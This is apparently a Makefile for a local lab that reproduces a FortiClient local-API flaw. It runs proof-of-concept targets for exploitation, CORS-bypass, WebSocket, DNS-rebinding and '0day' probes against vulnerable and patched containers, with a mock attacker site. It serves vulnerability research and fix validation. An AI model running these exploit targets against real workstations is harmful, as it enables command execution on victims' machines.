NET        := cve121529lab
LAB_IMG    := cve-2026-121529:vuln
POC_IMG    := cve-2026-121529-poc:local
VULN_SRV   := forticlient-vuln
CORS_SRV   := forticlient-fixed-cors
ORIGIN_SRV := forticlient-fixed-origin-only
STRICT_SRV := forticlient-fixed-strict
ATT_SRV    := attacker-site
RESULTS    := $(CURDIR)/results
ATTACKER   := http://$(ATT_SRV):8080

# The PoC joins the network namespace of the endpoint container, so that
# http://127.0.0.1:9191 inside the browser is the very same loopback the FortiClient
# local API listens on -- exactly like a browser running on the victim's workstation.
poc_for = podman run --rm --cpus 2 --memory 4g --network container:$(1) \
                      -v $(RESULTS):/results $(POC_IMG)
POC      := $(call poc_for,$(VULN_SRV))
POC_CORS := $(call poc_for,$(CORS_SRV))
POC_ORIG := $(call poc_for,$(ORIGIN_SRV))
POC_STR  := $(call poc_for,$(STRICT_SRV))

.PHONY: prepare up down check-vuln check-fixed check-fixed-cors check-fixed-origin-only \
        exploit-vuln exploit-fixed-cors exploit-fixed exploit-fixed-origin-only \
        mitigation probe rebind raw raw-vuln ws 0day differential evidence clean

prepare:
	podman network exists $(NET) || podman network create $(NET)
	podman build --network host -f lab/Containerfile -t $(LAB_IMG) .
	podman build --network host -f poc/Containerfile -t $(POC_IMG) poc/

up:
	podman rm -f $(VULN_SRV) $(CORS_SRV) $(ORIGIN_SRV) $(STRICT_SRV) $(ATT_SRV) >/dev/null 2>&1 || true
	podman run -d --name $(VULN_SRV) --network $(NET) --cpus 2 --memory 4g \
	    -e FCT_MODE=vuln -v $(RESULTS):/results $(LAB_IMG) >/dev/null
	podman run -d --name $(CORS_SRV) --network $(NET) --cpus 2 --memory 4g \
	    -e FCT_MODE=fixed-cors -v $(RESULTS):/results $(LAB_IMG) >/dev/null
	podman run -d --name $(ORIGIN_SRV) --network $(NET) --cpus 2 --memory 4g \
	    -e FCT_MODE=fixed-origin-only -v $(RESULTS):/results $(LAB_IMG) >/dev/null
	podman run -d --name $(STRICT_SRV) --network $(NET) --cpus 2 --memory 4g \
	    -e FCT_MODE=fixed-strict -v $(RESULTS):/results $(LAB_IMG) >/dev/null
	podman run -d --name $(ATT_SRV) --network $(NET) --cpus 2 --memory 4g \
	    --entrypoint python3 -v $(RESULTS):/results $(LAB_IMG) \
	    -u /opt/lab/attacker_server.py >/dev/null
	sleep 3

down:
	podman rm -f $(VULN_SRV) $(CORS_SRV) $(ORIGIN_SRV) $(STRICT_SRV) $(ATT_SRV) >/dev/null 2>&1 || true

## ---------------------------------------------------------------- check ----
# Classification.  Exit code 1 = vulnerable, 0 = safe.
# The leading '-' keeps make from aborting on the documented exit codes; the code that
# the PoC returned is always part of its JSON output ("exit_code").
check-vuln:
	-$(POC) check --target http://127.0.0.1:9191 --attacker $(ATTACKER)

check-fixed:
	-$(POC_STR) check --target http://127.0.0.1:9191 --attacker $(ATTACKER)

check-fixed-cors:
	-$(POC_CORS) check --target http://127.0.0.1:9191 --attacker $(ATTACKER)

# Remediation that validates the origin server-side but still accepts a request that
# carries no Origin header (the shape a plausible patch takes).
check-fixed-origin-only:
	-$(POC_ORIG) check --target http://127.0.0.1:9191 --attacker $(ATTACKER)

## -------------------------------------------------------------- exploit ----
exploit-vuln:
	-$(POC) exploit --target http://127.0.0.1:9191 --attacker $(ATTACKER)

exploit-fixed-cors:
	-$(POC_CORS) exploit --target http://127.0.0.1:9191 --attacker $(ATTACKER)

exploit-fixed:
	-$(POC_STR) exploit --target http://127.0.0.1:9191 --attacker $(ATTACKER)

exploit-fixed-origin-only:
	-$(POC_ORIG) exploit --target http://127.0.0.1:9191 --attacker $(ATTACKER)

## ----------------------------------------------------------- mitigation ----
# The CORS-header-only remediation.  The HTTP answer is blocked, the command still
# runs, and the WebSocket surface is not covered by CORS at all.
mitigation:
	-$(POC_CORS) mitigation --target http://127.0.0.1:9191 --attacker $(ATTACKER)

## ------------------------------------------------------------------ ws ----
# The WebSocket surface: no CORS policy governs it.
ws:
	-$(POC_CORS) ws --target http://127.0.0.1:9191 --attacker $(ATTACKER)

## --------------------------------------------------------------- probe ----
# Sibling paths a fix could leave open.
probe:
	-$(POC_STR) probe --target http://127.0.0.1:9191 --attacker $(ATTACKER)

rebind:
	-$(POC_STR) rebind --target http://127.0.0.1:9191 --attacker $(ATTACKER)

raw:
	-$(POC_STR) raw --target http://127.0.0.1:9191 --attacker $(ATTACKER)

# The same raw probes against the vulnerable model, for the contrast.
raw-vuln:
	-$(POC) raw --target http://127.0.0.1:9191 --attacker $(ATTACKER)

## --------------------------------------------------------------- 0day ----
0day:
	-$(POC_STR) 0day --target http://127.0.0.1:9191 --attacker $(ATTACKER)

## --------------------------------------------------------- differential ----
# The four origin-validation models side by side.
differential:
	bash run-lab.sh differential

evidence:
	bash run-lab.sh evidence

clean:
	podman rm -f $(VULN_SRV) $(CORS_SRV) $(STRICT_SRV) $(ATT_SRV) >/dev/null 2>&1 || true
	rm -rf $(RESULTS)

exploit:
	python3 exploit/exploit.py
